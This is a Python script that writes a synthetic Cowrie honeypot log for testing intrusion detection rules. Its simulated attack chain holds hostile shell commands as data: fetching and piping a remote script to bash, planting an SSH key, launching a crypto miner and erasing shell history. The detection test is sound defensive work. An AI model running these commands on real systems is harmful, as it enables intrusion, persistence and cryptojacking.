#!/usr/bin/env python3
"""Generate a deterministic synthetic Cowrie log using RFC 5737 documentation IPs.
Run: python detections/tests/make_sample.py > detections/tests/sample_cowrie.jsonl
"""
import json
from datetime import datetime, timedelta, timezone

T0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=timezone.utc)
events = []


def ev(sec, eventid, ip, session, **kw):
    ts = (T0 + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
    events.append({"timestamp": ts, "eventid": eventid, "src_ip": ip, "session": session, **kw})


# 203.0.113.10: brute force with repeated username -> HP-001 only
for i in range(12):
    ev(i * 2, "cowrie.login.failed", "203.0.113.10", "s1", username="root", password=f"pw{i}")

# 203.0.113.20: spraying many usernames slowly -> HP-002 only
for i, user in enumerate(["admin", "oracle", "pi", "ubuntu", "test", "git"]):
    ev(100 + i * 20, "cowrie.login.failed", "203.0.113.20", "s2", username=user, password="123456")

# 198.51.100.7: full attack chain
ip = "198.51.100.7"
ev(300, "cowrie.login.success", ip, "s3", username="root", password="root")
for i, cmd in enumerate([
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "cd /tmp; wget http://192.0.2.50/bins.sh -O bins.sh; chmod +x bins.sh",
    "curl -s http://192.0.2.50/setup.sh | bash",
    "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA... x' >> ~/.ssh/authorized_keys",
    "./xmrig -o stratum+tcp://pool.example:3333",
    "history -c; unset HISTFILE",
]):
    ev(305 + i * 3, "cowrie.command.input", ip, "s3", input=cmd)
ev(330, "cowrie.session.file_download", ip, "s3", url="http://192.0.2.50/bins.sh",
   shasum="0" * 64, outfile="var/lib/cowrie/downloads/0000")

# 203.0.113.99: benign-looking noise that must NOT alert
ev(400, "cowrie.session.connect", "203.0.113.99", "s4")
ev(401, "cowrie.login.failed", "203.0.113.99", "s4", username="root", password="x")
ev(402, "cowrie.command.input", "203.0.113.99", "s4", input="ls -la")

events.sort(key=lambda e: e["timestamp"])
for e in events:
    print(json.dumps(e))
